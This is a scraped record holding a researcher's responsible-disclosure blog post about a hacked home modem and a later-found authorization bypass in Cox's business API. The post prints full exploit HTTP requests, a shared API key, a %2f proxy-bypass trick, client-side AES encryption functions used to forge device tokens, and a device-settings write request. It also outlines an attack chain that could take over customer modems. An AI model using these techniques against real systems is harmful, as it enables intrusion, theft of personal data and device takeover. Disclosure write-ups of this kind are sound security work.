[
  {
    "id": 40570781,
    "title": "Exposing ISP Vulnerabilities: A Personal Journey from Hacked Modem to Major Security Flaw",
    "originLink": "https://samcurry.net/hacking-millions-of-modems",
    "originBody": "‹ Back Hacking Millions of Modems (and Investigating Who Hacked My Modem) Mon Jun 03 2024 Introduction Two years ago, something very strange happened to me while working from my home network. I was exploiting a blind XXE vulnerability that required an external HTTP server to smuggle out files, so I spun up an AWS box and ran a simple Python webserver to receive the traffic from the vulnerable server: python3 -m http.server 8000 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... Once the webserver was running, I sent a cURL request from my home computer to make sure that it could receive external HTTP requests: curl \"http://54.156.88.125:8000/test123\" Just a few seconds later, I saw the following log: 98.161.24.100 - [16:32:12] \"GET /test123 HTTP/1.1\" Perfect, this meant that I was able to receive network traffic on the box. Everything seemed good to go, but right as I switched back to exploiting the vulnerability, something very unexpected appeared in my log file: 98.161.24.100 - [16:32:12] \"GET /test123 HTTP/1.1\" 159.65.76.209 - [16:32:22] \"GET /test123 HTTP/1.1\" An unknown IP address had replayed the exact same HTTP request just 10 seconds later. \"Wow, that’s seriously weird,\" I thought. Somewhere, between my home network and the AWS box, someone had intercepted and replayed my HTTP traffic. This traffic should not be accessible. There is no intermediary between these two systems who should be seeing this. My immediate thought was that my computer had been hacked and that the hacker was actively monitoring my traffic. To check if the same behavior occured on a different device, I pulled out my iPhone and typed in the URL into Safari. I sent the request, then peaked at my log file: 98.161.24.100 - [16:34:04] \"GET /uhhhh HTTP/1.1\" 159.65.76.209 - [16:34:16] \"GET /uhhhh HTTP/1.1\" The same unknown IP address had intercepted and replayed both HTTP requests from my computer and iPhone. Somehow, someone was intercepting and replaying the web traffic from likely every single device on my home network. Panicked, I spun up a new AWS box running Nginx to make sure that the original instance hadn't been compromised somehow. sudo service nginx start tail -f /var/log/nginx/access.log I opened the URL once again from my iPhone and saw the exact same logs: 98.161.24.100 - [16:44:04] \"GET /whatisgoingon1234 HTTP/1.1\" 159.65.76.209 - [16:44:12] \"GET /whatisgoingon1234 HTTP/1.1\" Through what could only be my ISP, modem, or AWS being compromised, someone was intercepting and replaying my HTTP traffic immediately after I'd sent it. To eliminate the absurd idea that AWS had been compromised, I spun up a box on GCP instead and observed the same unknown IP address replaying my HTTP requests. It wasn’t AWS. The only real option left was that my modem had been hacked, but who was the attacker? I queried the owner of the IP address and found that it belonged to DigitalOcean. Strange. That definitely didn't belong to my ISP. Who are you, 159.65.76.209? To kick off an investigation, I sent the IP address to some friends who worked for threat intelligence companies. They sent me a link to the VirusTotal listing for the IP address which detailed all of the domains which resolved to the IP address over the past few years. Out of the last 5 domains that were tied to the IP address, 3 were phishing websites, and 2 were what appeared to be mail servers. The following domains all at one point in time resolved to the DigitalOcean IP address: regional.adidas.com.py (2019/11/26) isglatam.online (2019/12/08) isglatam.tk (2020/11/11) mx12.limit742921.tokyo (2021/08/08) mx12.jingoism44769.xyz (2022/04/12) Two of the domains associated with the 159.65.76.209 IP address were isglatam.online and isglatam.tk. These were both at one point in time phishing websites for isglatam.com, a South American cybersecurity company. After visiting the real ISG Latam website, we learned that they are based out of Paraguay and partnered with Crowdstrike, AppGate, Acunetix, DarkTrace, and ForcePoint. From a 10 minute read of everything, it appeared that the people who were intercepting my traffic had tried to phish ISG Latam using the same IP address. Hackers Hacking Hackers? Now this was odd. The IP address, just one year prior, was being used to host phishing infrastructure that targeted a South American cybersecurity company. Assuming that they have been in control of this IP address for 3 years, it would mean that they have used it for at least 2 different phishing campaigns and what appeared to be a C&C server for router malware? Through URLscan, I learned that the isglatam.online and isglatam.tk websites were hosting generic BeEF phishing sites that can historically be seen here. The signature of the attacker was super interesting, because they were doing a lot of different malicious activities from the same box and apparently had not gotten suspended in over 3 years. It was really hard to piece together their intent with the Adidas, ISG Latam, and modem hacking thing all coming from the same IP address. There was a chance that the IP had rotated between different owners over the years, but it didn't seem likely as the gaps in between everything were long and it was unlikely that it was immediately reassigned to another malicious party. Realizing that the infected device was still running, I walked over, unplugged it, and placed it into a cardboard box. Handing Over Evidence The modem that I had been using was the Cox Panoramic Wifi gateway. After learning that it was likely compromised, I went to the local Cox store to show them my device and ask for a new one. The one issue with this request was that in order for me to receive a new modem, I had to hand over the old one. Sadly, it wasn't actually my property — I was only renting it from the ISP. I explained to the employee how I wanted to keep and reverse engineer the device. Their eyes shot up a little bit. They were much less enthusiastic about giving it back to me. “There’s no way I can keep it?” I asked. “No, we need to take your old one to give you a new one,” the ISP representative said. There was no budging. As much as I wanted to take it apart, dump the firmware, and see if there was any trace of whatever potentially compromised it, I had already passed the device off to the employee. I took my new device and left the store, disappointed that I wasn’t able to do anything more with it. After setting up the new modem, the previous behavior completely stopped. My traffic was no longer being replayed. There was no \"other IP\" in the logs. Everything seemed fixed. With a bit of dissapointment I concluded that the modem I no longer had access to was what had been compromised. Since I’d handed it over to the ISP and replaced the device, there wasn’t anything more that I could investigate besides maybe seeing if my computer had gotten hacked. I gave up trying to figure it out. At least for the time being. Three Years Later In early 2024, almost three years later, I was on vacation with some friends who also worked in cybersecurity. We were having a conversation over dinner when I explained the story to them. Curious to learn more, they asked me for all of the details and thought it’d be fun to run their own investigation. The first thing that caught their attention (having worked on more malware analysis a lot more than I had) was the format of the two mail server domains (limit742921.tokyo and jingoism44769.xyz). They pulled the IP address of the mx1 subdomain for limit742921.tokyo and then ran a reverse IP search on all domains that had at one point in time pointed to that same IP address. There were over 1,000 domains that all followed the exact same pattern... {\"rrname\":\"acquire543225.biz.\",\"rrtype\":\"A\",\"rdata\":\"153.127.55.212\"} {\"rrname\":\"battery935904.biz.\",\"rrtype\":\"A\",\"rdata\":\"153.127.55.212\"} {\"rrname\":\"grocery634272.biz.\",\"rrtype\":\"A\",\"rdata\":\"153.127.55.212\"} {\"rrname\":\"seventy688181.biz.\",\"rrtype\":\"A\",\"rdata\":\"153.127.55.212\"} Every single domain that was registered by the discovered IP address used the same naming convention: [word][6 numbers].[TLD] Due to the mass-number of domains and algorithmic structure of the registered address, this appeared to be a domain generation algorithm used by malware operators to rotate the resolving address for the C&C server for the purpose of obfuscation. There was a good chance that the IP address replaying my traffic was a C&C server, and the two domains which I thought were mail servers were actually algorithmically generated pointers to the C&C server. Something disappointing was that all of these domains were historical; the last one seen was registered on March 17, 2023. None of the hosts resolved to anything anymore, and we couldn’t seem to identify anything similar being registered to the same IP address. Given that my new modem was the same model that had been compromised, I was curious if the attacker had found a way back in. From a quick Google search I’d learned that there were no public vulnerabilities for the model of modem that I had (even though it was now 3 years later) so if there was an exploit, they were doing a great job keeping it private. The other option that seemed more-and-more likely was that they had exploited something outside of a generic router exploit. I was super curious to investigate this and try to brainstorm ways that my device could’ve been compromised. Targeting REST APIs using the TR-069 Protocol After getting back home, a close friend had asked if I’d be able to help him move furniture into his new house. What this also meant was helping him transfer over his Cox modem. After connecting his device to the fiber line, I went ahead and called the ISP support and asked if they’d be able to push out an update to allow the device to work in the new location. The agent confirmed they could remotely update the device settings, including changing the WiFi password and viewing connected devices. The ability of support agents to control devices really interested me, especially since they could update pretty much anything on the device. This extensive access was facilitated by a protocol known as TR-069, implemented in 2004, which allowed ISPs to manage devices within their own network via port 7547. This protocol had already been the subject of a few great DEF CON talks and wasn’t externally exposed, so I wasn’t super interested in bug hunting the protocol itself. What I was interested in, however, were the tools that the support agent was using to manage the device. To theorycraft a little bit, if I were a hacker who wanted to compromise my modem I'd likely target whatever infrastructure powered the support tools that the agents were using. There was probably some internal website for device management that support agents used, backed by an API that could execute arbitrary commands and change/view administrative settings of customer devices. If I could find some way to access this functionality, it might shed light on how I might have been originally hacked and patch out at least one method for someone to compromise my modem. Hacking Millions of Modems The first thing that I decided to look at was the Cox Business portal. This app had a ton of interesting functionality to remotely manage devices, set firewall rules, and monitor network traffic. Without actually having a Cox business account myself, I opened the login page for the portal and grabbed a copy of the main.36624ed36fb0ff5b.js file that powered the core functionality of the app. After beautifying it, I parsed out all of the routes and scrolled through them: /api/cbma/voicemail/services/voicemail/inbox/transcribeMessage/ /api/cbma/profile/services/profile/userroles/ /api/cbma/accountequipment/services/accountequipment/equipments/eligibleRebootDevice /api/cbma/accountequipment/services/accountequipment/casedetail /api/cbma/user/identity/services/useridentity/user/verifyContact /api/cbma/user/identity/services/useridentity/user/contact/validate ... There were over 100 different API calls that all had the same base path of /api/cbma/. Since this route seemed to be power most device-related functionality, I thought it was worth investigating if the /api/cbma/ endpoint happened to be a reverse proxy to another host. I tested this by sending the following requests: HTTP request that does not start with api/cbma (returns 301): GET /api/anything_else/example HTTP/1.1 Host: myaccount-business.cox.com HTTP/1.1 301 Moved Permanently Location: https://myaccount-business.cox.com/cbma/api/anything_else/example HTTP request that does start with api/cbma (returns 500): GET /api/cbma/example HTTP/1.1 Host: myaccount-business.cox.com HTTP/1.1 500 Internal Server Error Server: nginx From sending the above HTTP requests, we learn that the api/cbma endpoint is an explicit route that is likely a reverse proxy to another host due to the differing behavior around the HTTP response. When we request anything besides api/cbma, it responds with a 302 redirect instead of the 500 internal server error triggered from api/cbma. This indicated that they were proxying API requests to a dedicated backend while serving the frontend files from the normal system. Since the API itself had all of the interesting device management functionality, it made sense to focus on everything behind the api/cbma route and see if there was any low hanging fruit like exposed actuators, API documentation, or any directory traversal vulnerabilities that would allow us to escalate permissions. I went ahead and proxied the registration request for the Cox Business portal which was underneath the api/cbma path: POST /api/cbma/userauthorization/services/profile/validate/v1/email HTTP/1.1 Host: myaccount-business.cox.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0 Accept: application/json, text/plain, */* Content-Type: application/json Clientid: cbmauser Apikey: 5d228662-aaa1-4a18-be1c-fb84db78cf13 Cb_session: unauthenticateduser Authorization: Bearer undefined Ma_transaction_id: a85dc5e0-bd9d-4f0d-b4ae-4e284351e4b4 Content-Length: 28 Connection: close {\"email\":\"test@example.com\"} HTTP/1.1 200 OK Content-Type: application/json Content-Length: 126 { \"message\": \"Success\", \"id\": \"test@example.com\" } The HTTP request contained a bunch of different authorization headers including what looked to be a general-use API key that was shared between users. The clientid and Cb_session keys looked very custom and indicated there were multiple roles and permissions used in the application. The HTTP response looked like a generic Spring response, and we could likely quickly confirm that the backend API was running spring by simply changing the POST to GET and observing the response: GET /api/cbma/userauthorization/services/profile/validate/v1/email HTTP/1.1 Host: myaccount-business.cox.com HTTP/1.1 500 Internal Server Error Content-type: application/json { \"timestamp\": \"2024-04-12T08:57:14.384+00:00\", \"status\": 500, \"error\": \"Internal Server Error\", \"path\": \"/services/profile/validate/v1/email\" } Yup, that was definitely a Spring error. Since we could confirm that the reverse proxy was running Spring, I decided to look for actuators and exposed API docs. I went ahead and tried to guess the actuator route: ❌ GET /api/cbma/userauthorization/services/profile/validate/v1/email/actuator/ ❌ GET /api/cbma/userauthorization/services/profile/validate/v1/actuator/ ❌ GET /api/cbma/userauthorization/services/profile/validate/actuator/ ❌ GET /api/cbma/userauthorization/services/profile/actuator/ ❌ GET /api/cbma/userauthorization/services/actuator/ ❌ GET /api/cbma/userauthorization/actuator/ ❌ GET /api/cbma/actuator/ Shame, no easy actuators. I then checked for accessible API documentation: ❌ GET /api/cbma/userauthorization/services/profile/validate/v1/email/swagger-ui/index.html ❌ GET /api/cbma/userauthorization/services/profile/validate/v1/swagger-ui/index.html ❌ GET /api/cbma/userauthorization/services/profile/validate/swagger-ui/index.html ❌ GET /api/cbma/userauthorization/services/profile/swagger-ui/index.html ❌ GET /api/cbma/userauthorization/services/swagger-ui/index.html ✅ GET /api/cbma/userauthorization/swagger-ui/index.html We had a hit! There was a swagger landing page at /api/cbma/profile/swagger-ui/index.html. I loaded the page expecting to see API routes, however... Totally empty. Something was causing the page not to load. I checked the network traffic and there seemed to be in an infinite redirect loop when attempting to load any static resource: GET /api/cbma/ticket/services/swagger-ui/swagger-initializer.js HTTP/1.1 Location: /cbma/api/cbma/userauthorization/services/swagger-ui/swagger-initializer.js ... GET /cbma/api/cbma/ticket/services/swagger-ui/swagger-initializer.js HTTP/1.1 Location: /cbma/cbma/api/cbma/userauthorization/services/swagger-ui/swagger-initializer.js It seemed that requests to load static resources for the page (.png, .js, .css) were all being routed through the base URI instead of the reverse proxy API host. What this meant was there was probably a proxy rule for static assets, so I changed the extension to test this: GET /api/cbma/userauthorization/services/swagger-ui/swagger-initializer.anythingElse HTTP/1.1 Host: myaccount-business.cox.com HTTP/1.1 500 Internal Server Error Server: nginx After confirming that the .js extension was triggering the routing of the request to the original host, we now needed to find a way to load the resource from the API reverse proxy but without hitting the rule condition which switched routing for static files. The simplest way to do this, since the request was being proxied, was to check if there was any character that we could add which would “drop off” in transit. Loading Static Resources from Reverse Proxy API To fuzz this, I simply used Burp’s intruder to enumerate from %00 to %FF at the end of the URL. After about 30 seconds of running, we had a 200 OK by appending the URL encoded / symbol: GET /api/cbma/userauthorization/services/swagger-ui/swagger-initializer.js%2f HTTP/1.1 Host: myaccount-business.cox.com HTTP/2 200 OK Content-Type: application/javascript window.onload = function() { window.ui = SwaggerUIBundle({ url: \"https://petstore.swagger.io/v2/swagger.json\", dom_id: '#swagger-ui', deepLinking: true, presets: [ SwaggerUIBundle.presets.apis, SwaggerUIStandalonePreset ], plugins: [ SwaggerUIBundle.plugins.DownloadUrl ], layout: \"StandaloneLayout\" , \"configUrl\" : \"/services/v3/api-docs/swagger-config\", \"validatorUrl\" : \"\" }); // }; By appending the %2f to the .js extension, we could load the JS files. I wrote a rule to append %2f to all static resources using Burp’s match-and-replace then reloaded the page. Perfect, the swagger routes had loaded. I used the same trick to load all the swagger docs on all of the other API endpoints. In total, there were about 700 different API calls with each API having the following number of calls: account (115 routes) voiceutilities (73 routes) user (70 routes) datainternetgateway (57 routes) accountequipment (55 routes) billing (53 routes) ticket (52 routes) profile (47 routes) voicecallmanagement (46 routes) voicemail (37 routes) voiceusermanagement (30 routes) userauthorization (24 routes) csr (16 routes) voiceprofile (14 routes) After quickly skimming through everything, the following APIs appeared to have the most functionality for interacting with hardware and accessing customer accounts: accountequipment (55 routes) datainternetgateway (57 routes) account (115 routes) Copying the HTTP request that I’d used to register to the website, I ran an intruder script to hit every single GET endpoint to check if there were any accessible unauthenticated API endpoints. What came back was really interesting. There was a 50/50 split of endpoints which gave an authorization error or 200 OK HTTP response. Accidentally Discovering an Authorization Bypass on the Cox Backend API After the intruder scan of all of the API endpoints completed, I scrolled through to see if any had any interesting responses. The following \"profilesearch\" endpoint had an interesting HTTP response which appeared to be returning a blank JSON object from what looked to be an empty search: GET /api/cbma/profile/services/profile/profilesearch/ HTTP/1.1 Host: myaccount-business.cox.com Clientid: cbmauser Apikey: 5d228662-aaa1-4a18-be1c-fb84db78cf13 Cb_session: unauthenticateduser Authorization: Bearer undefined HTTP/1.1 200 OK Content-type: application/json { \"message\": \"Success\", \"profile\": { \"numberofRecords\": \"0 hits\", \"searchList\": [] } } From looking at the JavaScript, it seemed that we’d need to add an argument to the URI for a profile to search for. I went ahead and typed in test into the URI and got the following response: { \"message\": \"Authorization Error-Invalid User Token\" } Invalid user token? But I’d just been able to hit this endpoint? I removed the word test from the URI and resent this request. Another authorization error! For some reason, the original endpoint without parameters was now returning an authorization error even though we could just hit it when running intruder. I did a sanity check and confirmed that nothing had changed between the request in intruder and my repeater request. I replayed the request one more time, but surprisingly this time it gave me the original 200 OK and the JSON response from intruder! What was going on? It seemed to be intermittently giving me authorization errors or saying that the request had been successful. To test if I could reproduce this with an actual search query, I wrote down cox in the URI and replayed the request 2-3 more times until I saw the following response: { \"message\": \"Success\", \"profile\": { \"numberofRecords\": \"10000+ hits\", \"searchList\": [ { \"value\": \"COX REDACTED\", \"profileGuid\": \"cbbccdae-b1ab-4e8c-9cec-e20c425205a1\" }, { \"value\": \"Cox Communications SIP Trunk REDACTED\", \"profileGuid\": \"bc2a49c7-0c3f-4cab-9133-de7993cb1c7d\" }, { \"value\": \"cox test account ds1/REDACTED\", \"profileGuid\": \"74551032-e703-46a2-a252-dc75d6daeedc\" } ] } } Woah! These looked like profiles of Cox business customers. Not really expecting results, I replaced the word \"cox\" with \"fbi\" to see if it was actually pulling customer data: { \"message\": \"Success\", \"profile\": { \"numberofRecords\": \"REDACTED hits\", \"searchList\": [ { \"value\": \"FBI REDACTED\", \"profileGuid\": \"7b9f092a-e938-41d5-bcf5-0be1bb6487f5\" }, { \"value\": \"FBI REDACTED\", \"profileGuid\": \"c8923f6f-b4ed-4f66-a743-000a961edb35\" }, { \"value\": \"FBI REDACTED\", \"profileGuid\": \"a32b8112-48ac-4a4f-8893-5ca1c392a31d\" } ] } } Oh, no. The above response contained the physical addresses of several FBI field offices who were Cox business customers. The administrative customer search API request was working. Not good! We had confirmed that we could bypass authorization for the API endpoints by simply replaying the HTTP request multiple times, and there were over 700 other API requests that we could hit. It was time to see what the real impact was. Confirming We Can Access Anyone's Equipment I looked back at the results of the intruder scan, now knowing that I could bypass authorization by simply replaying a request. In order to figure out if this vulnerability could've been used to hack my modem, I needed to know if this API had access to the residential network at an access control level. Cox offered both residential and business services, but under the hood, I was guessing that the underlying API had access to both. I went ahead and pulled out the simplest looking request that took in a macAddress parameter to test if I could access my own modem via the API. /api/cbma/accountequipment/services/accountequipment/ipAddress?macAddress=:mac This was a GET request to retrieve a modem IP address that required a macAddress parameter. I logged into Cox, retrieved my own MAC address, then sent the HTTP request over-and-over until it returned 200 OK: GET /api/cbma/accountequipment/services/accountequipment/ipAddress?macAddress=f80c58bbcb90 HTTP/1.1 Host: myaccount-business.cox.com Clientid: cbmauser Apikey: 5d228662-aaa1-4a18-be1c-fb84db78cf13 Cb_session: unauthenticateduser Authorization: Bearer undefined HTTP/1.1 200 OK Content-type: application/json { \"message\": \"Success\", \"ipv4\": \"98.165.155.8\" } It worked! We were accessing our own device through the Cox Business website API! This meant that whatever was running on this could actually be used to talk to the devices. Cox provided service to millions of customers, and this API seemingly allowed me to directly communicate via MAC address with anyone's device. The next question I had was whether or not we could retrieve the MAC addresses of the hardware connected to someone's account via searching their account ID (which we had retrieved previously through the customer query endpoint). I found the accountequipment/services/accountequipment/v1/equipments endpoint in my swagger list and threw it in my Burp Repeater with my own account ID. It returned the following information: GET /api/cbma/accountequipment/services/accountequipment/v1/equipments/435008132203 HTTP/1.1 Host: myaccount-business.cox.com Clientid: cbmauser Apikey: 5d228662-aaa1-4a18-be1c-fb84db78cf13 Cb_session: unauthenticateduser Authorization: Bearer undefined HTTP/1.1 200 OK Content-type: application/json { \"accountEquipmentList\": [ { \"equipmentCategory\": \"Internet\", \"equipmentModelMake\": \"NOKIA G-010G-A\", \"equipmentName\": \"NOKIA G-010G-A\", \"equipmentType\": \"Nokia ONT\", \"itemModelMake\": \"NOKIA\", \"itemModelNumber\": \"G-010G-A\", \"itemNumber\": \"DAL10GB\", \"macAddress\": \"f8:0c:58:bb:cb:92\", \"portList\": [ { \"address\": \"F80C58BBCB92\", \"portNumber\": \"1\", \"portType\": \"ONT_ALU\", \"qualityAssuranceDate\": \"20220121\", \"serviceCategoryDescription\": \"Data\" } ], \"serialNumber\": \"ALCLEB313C84\" }, { \"equipmentCategory\": \"Voice\", \"equipmentModelMake\": \"CISCO DPQ3212\", \"equipmentName\": \"CISCO DPQ3212\", \"equipmentType\": \"Cable Modem\", \"itemModelMake\": \"CISCO\", \"itemModelNumber\": \"DPQ3212\", \"itemNumber\": \"DSA321N\", \"macAddress\": \"e4:48:c7:0d:9a:71\", \"portList\": [ { \"address\": \"E448C70D9A71\", \"portNumber\": \"1\", \"portType\": \"DATA_D3\", \"qualityAssuranceDate\": \"20111229\", \"serviceCategoryDescription\": \"Unknown\" }, { \"address\": \"E448C70D9A75\", \"portNumber\": \"2\", \"portType\": \"TELEPHONY\", \"qualityAssuranceDate\": \"20111229\", \"serviceCategoryCode\": \"T\", \"serviceCategoryDescription\": \"Telephone\" } ], \"serialNumber\": \"240880144\" }, { \"equipmentCategory\": \"Television\", \"equipmentModelMake\": \"Cox Business TV (Contour 1)\", \"equipmentName\": \"Cox Business TV (Contour 1)\", \"equipmentType\": \"Cable Receiver\", \"itemModelMake\": \"CISCO\", \"itemModelNumber\": \"650\", \"itemNumber\": \"GSX9865\", \"macAddress\": \"50:39:55:da:93:05\", \"portList\": [ { \"address\": \"44E08EBB6DBC\", \"portNumber\": \"1\", \"portType\": \"CHDDVRX1\", \"qualityAssuranceDate\": \"20131108\", \"serviceCategoryDescription\": \"Cable\" } ], \"serialNumber\": \"SACDRVKQN\" } ] } It worked! My connected equipment was returned in the HTTP response. Accessing and Updating any Cox Business Customer Account To test if this could be abused to access and modify business customer accounts, I found an API request which could query customers via email. I sent the following HTTP request and saw the following response: GET /api/cbma/user/services/user/admin@cox.net HTTP/1.1 Host: myaccount-business.cox.com HTTP/1.1 200 OK Content-type: application/json { \"id\": \"admin@cox.net\", \"guid\": \"89d6db21-402d-4a57-a87b-cad85d01b192\", \"email\": \"admin@cox.net\", \"firstName\": \"Redacted\", \"lastName\": \"Redacted\", \"primaryPhone\": \"Redacted\", \"status\": \"INACTIVE\", \"type\": \"RETAIL\", \"profileAdmin\": true, \"profileOwner\": true, \"isCpniSetupRequired\": false, \"isPasswordChangeRequired\": true, \"timeZone\": \"EST\", \"userType\": \"PROFILE_OWNER\", \"userProfileDetails\": { \"id\": \"{3DES}JA1+doxmDYc=\", \"guid\": \"9795bd4c-92d6-4aa2-ad30-1da4bbcbe1da\", \"name\": \"Supreme Carpet Care\", \"status\": \"ACTIVE\", \"ownerEmail\": \"admin@cox.net\" }, \"contactType\": { \"contactInfo\": [ { \"type\": \"alternateEmail\", \"value\": \"redacted@redacted.com\" } ] }, \"preferredEmail\": \"admin@cox.net\" } Another similar POST account update request worked. This confirmed we could read and write to business accounts. At this point, I'd demonstrated that it was possible to (1) search a customer and retrieve their business account PII using only their name, then (2) retrieve the MAC addresses of the connected hardware on their account, then (3) run commands against the MAC address via the API. It was time to find some API endpoints that actually wrote to the device to simulate an attacker attempting to get code execution. Overwriting Anyone's Device Settings via Leaked Cryptographic Secret Looking through the swagger docs, it seemed that every hardware modification requests (e.g. update device password) required a parameter called encryptedValue. If I could find a way to generate this value, then I could demonstrate write access to modems which would lead to remote code execution. To know if I could even generate this encryptedValue parameter, I had to dig through the original JavaScript to figure out exactly how it was being signed. JS After tracing the encryptedValue parameter back through the JavaScript, I landed on these two functions: encryptWithSaltandPadding(D) { const k = n.AES.encrypt(D, this.getKey(), { iv: n.enc.Hex.parse(s.IV) }).ciphertext.toString(n.enc.Base64); return btoa(s.IV + \"::\" + s.qs + \"::\" + k) } decryptWithSaltandPadding(D) { const W = atob(D), k = this.sanitize(W.split(\"::\")[2]), M = n.lib.CipherParams.create({ ciphertext: n.enc.Base64.parse(k) }); return n.AES.decrypt(M, this.getKey(), { iv: n.enc.Hex.parse(s.IV) }).toString(n.enc.Utf8) } Both of these functions took in variables which only existed at runtime, so the easiest way to actually call these functions would be to find somewhere it was called within the actual UI. After searching for a little while, I’d realized that the 4-digit PIN that I set when registering my account was encrypted using the same function! I set a breakpoint at exactly where the encryptWithSaltAndPadding function was called, then hit enter. Now that I had a breakpoint set and I was in the correct context for the function I could simply paste the function into my console and run whatever I wanted. To validate that it worked, I copied the encrypted value of the PIN code that was sent in the POST request and passed it to the decrypt function. t.cbHelper.decryptWithSaltandPadding(\"OGEzMjNmNjFhOTk2MGI2OTM0NzAzNTkzODZkOGYxODI6OjhhNzU1NTNlMDAzOTlhNWQ5Zjk5ZTYzMzM3M2RiYWUzOjova3paY1orSjRGR0YwWGFvRkhwWHZRPT0=\") \"8042\" Perfect! It worked as expected. The only issue now was getting the encrypted value of a device. I asked around for a while until I found a friend who owned a MSP a few states away who used Cox Business. They gave me a login to their account and I saw what appeared to be an encryptedValue parameter in one of the HTTP responses after authenticating into their account. I copied this value and passed it to the decrypt function once again: t.cbHelper.decryptWithSaltandPadding(\"OGEzMjNmNjFhOTk2MGI2OTM0NzAzNTkzODZkOGYxODI6OjhhNzU1NTNlMDAzOTlhNWQ5Zjk5ZTYzMzM3M2RiYWUzOjpiYk1SNGQybzFLZHhRQ1VQNnF2TWl1QlZ0NEp6WVUyckJGMXF5T0dYTVlaNWdjZkhISTZnUFppdjM3dmtRSUcxclNkMC9WNmV2WFE1eko0VnFZUnFodz09\") 541051614702;DTC4131;333415591;1;f4:c1:14:70:4d:ac;Internet Well, that’s annoying. It looked like the encrypted parameter had the MAC address, but also an account ID and a few extra parameters. 541051614702 = Cox Account Number DTC4131 = Device Name 333415592 = Device ID 1 = Unknown f4:c1:14:70:4d:ac = MAC address Internet = Label If there was some validation which checked that the MAC address matched the account ID it would make exploiting this somewhat complicated. I investigated further. Executing Commands on Any Modem On a leap of faith, I tried signing an “encryptedValue” string with junk data for everything except the MAC address (e.g. 123456789012;1234567;123456789;1;f4:c1:14:70:4d:ac;ANYTHING) to see if it actually validated that the account ID matched the MAC address: t.cbHelper.encryptWithSaltandPadding(\"123456789012;1234567;123456789;1;f4:c1:14:70:4d:ac;ANYTHING\") OGEzMjNmNjFhOTk2MGI2OTM0NzAzNTkzODZkOGYxODI6OjhhNzU1NTNlMDAzOTlhNWQ5Zjk5ZTYzMzM3M2RiYWUzOjpLUlArd3Jqek5Ra3VlZUVReXVUWEZHbE91NWVQRzk0WEo1Zi9wSDdVZWxHVkFXYmtWd2Z2YmNHU1FWOVRFT2prZm5tNFhWZlQwNkQ3V2tDU1FqbHpIUT09 The only thing in the above parameter that was valid was the device serial number. If this request worked, it meant that I could use an “encryptedValue” parameter in the API that didn’t have to have a matching account ID. I sent the request and saw the exact same HTTP response as above! This confirmed that we didn’t need any extra parameters, we could just query any hardware device arbitrarily by just knowing the MAC address (something that we could retrieve by querying a customer by name, fetching their account UUID, then fetching all of their connected devices via their UUID). We now had essentially a full kill chain. I formed the following HTTP request to update my own device MAC addresses SSID as a proof of concept to update my own hardware: POST /api/cbma/accountequipment/services/accountequipment/gatewaydevice/wifisettings HTTP/1.1 Host: myaccount-business.cox.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0 Accept: application/json, text/plain, */* Clientid: cbmauser Apikey: 5d228662-aaa1-4a18-be1c-fb84db78cf13 Cb_session: unauthenticateduser Authorization: Bearer undefined Ma_transaction_id: 56583255-1cf3-41aa-9600-3d5585152e87 Connection: close Content-Type: application/json Content-Length: 431 { \"wifiSettings\": { \"customerWifiSsid24\": \"Curry\" }, \"additionalProperties\": { \"customerWifiSsid24\": [ \"Curry\" ] }, \"encryptedValue\": \"T0dFek1qTm1OakZoT1RrMk1HSTJPVE0wTnpBek5Ua3pPRFprT0dZeE9ESTZPamhoTnpVMU5UTmxNREF6T1RsaE5XUTVaams1WlRZek16TTNNMlJpWVdVek9qcENVMlp1TjJ0blVsTkNlR1ZhZDJsd05qZGhjWFo0TTJsaVJHSkhlU3N2TUhWVWFYZzJWVTByYzNsT2RYWklMek16VjJ4VldFYzJTMWx5VEVNMVRuSkxOVVF3VFhFek9UVmlUR2RGVFd4RUt6aGFUMnhoZHowOQ==\" } HTTP/1.1 200 OK Server: nginx { \"message\": \"Success\" } Did it work? It had only given me a blank 200 OK response. I tried re-sending the HTTP request, but the request timed out. My network was offline. The update request must've reset my device. About 5 minutes later, my network rebooted. The SSID name had been updated to “Curry”. I could write and read from anyone's device using this exploit. This demonstrated that the API calls to update the device configuration worked. This meant that an attacker could've accessed this API to overwrite configuration settings, access the router, and execute commands on the device. At this point, we had a similar set of permissions as the ISP tech support and could've used this access to exploit any of the millions of Cox devices that were accessible through these APIs. I reached out to Cox via their responsible disclosure page and shared details of the vulnerability. They took down the exposed API calls within six hours then began working on the authorization vulnerabilities. I was no longer able to reproduce any of the vulnerabilities the next day. Impact This series of vulnerabilities demonstrated a way in which a fully external attacker with no prerequisites could've executed commands and modified the settings of millions of modems, accessed any business customer's PII, and gained essentially the same permissions of an ISP support team. Cox is the largest private broadband provider in the United States, the third-largest cable television provider, and the seventh largest telephone carrier in the country. They have millions of customers and are the most popular ISP in 10 states. An example attack scenario would've looked like the following: Search for a Cox business target through the exposed APIs using their name, phone number, email address, or account number Retrieve their full account PII via querying the returned UUID from step one including device MAC addresses, email, phone number, and address Query their hardware MAC address to retrieve Wifi password and connected devices Execute arbitrary commands, update any device property, and takeover victim accounts There were over 700 exposed APIs with many giving administrative functionality (e.g. querying the connected devices of a modem). Each API suffered from the same permission issues where replaying HTTP requests repeatedly would allow an attacker to run unauthorized commands. Addendum After reporting the vulnerability to Cox, they investigated if the specific vector had ever been maliciously exploited in the past and found no history of abuse (the service I found the vulnerabilities in had gone live in 2023, while my device had been compromised in 2021). They had also informed me that they had no affiliation with the DigitalOcean IP address, meaning that the device had definitely been hacked, just not using the method disclosed in this blog post. I'm still super curious on the exact way in which my device was compromised as I had never made my modem externally accessible nor even logged into the device from my home network. This blog post really aims to highlight vulnerabilities in the layer of trust between the ISP and customer devices, but the modem could've been compromised by some other much more boring method (e.g. local CSRF to RCE 0day which I triggered locally within my home network). One of the things I'll never understand was why the attacker was replaying my traffic? They were clearly in my network and could access everything without being detected, why replay all the HTTP requests? So odd. Anyway, thanks for reading! More than happy to listen to any theories, comments, or whatever about what happened here. Feel free to reach out at samwcurry (symbol goes here) gmail (dot goes here) com. Timeline 03/04/2024 - Vulnerability reported to Cox via their responsible disclosure program 03/05/2024 - Vulnerability is hot-patched, all non-essential business endpoints return 403 and no longer function 03/06/2024 - Email Cox that I can no longer reproduce the vulnerability 03/07/2024 - Cox writes that they are beginning a comprehensive security review 04/10/2024 - Informed Cox of intent to disclose 90 days from disclosure 04/29/2024 - Shared link to blog post draft with Cox Thanks Thanks to @blastbots for the full redesign of the 